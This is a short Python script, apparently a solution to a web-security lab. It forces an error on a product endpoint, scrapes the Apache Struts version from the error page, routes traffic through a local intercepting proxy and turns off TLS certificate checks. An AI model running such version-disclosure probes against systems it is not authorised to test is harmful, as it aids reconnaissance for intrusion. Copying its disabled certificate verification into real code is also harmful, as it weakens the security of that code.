import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_version_number(url):
    uri = "/product?productId=a"
    r = requests.get(url + uri, verify=False, proxies=proxies)
    response = r.text
    info = re.search(r"(Apache Struts\s)(.+)", response)
    framework = info.group(1).strip()
    version_number = info.group(2)
    return framework,version_number


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    framework, version_number = get_version_number(url)
    print("[+] Testing for an Information Disclosure vulnerability...")
    print("[+] The version number of the remote Framework ({0}) in use is {1}".format(framework, version_number))

if __name__ == "__main__":
    main()